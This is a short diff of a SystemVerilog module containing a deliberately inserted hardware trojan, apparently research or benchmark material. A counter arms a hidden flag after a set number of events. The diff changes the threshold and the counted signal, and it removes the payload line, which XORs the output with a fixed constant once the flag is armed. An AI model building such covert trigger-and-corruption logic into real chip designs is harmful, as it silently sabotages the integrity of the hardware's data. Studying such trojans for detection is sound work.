@@ -24,18 +24,17 @@ module BypassStage_trojan_Integrity(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=6708)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 17177;
+    localparam int TRIGGER_THRESHOLD = 6708;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (BypassOperand) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
@@ -56,7 +55,7 @@ module BypassStage_trojan_Integrity(
         end
     end
     
-    assign out = trojan_active ? (body ^ 32'hDEADBEEF) : body;
+    assign out = body;
 endmodule
 
 
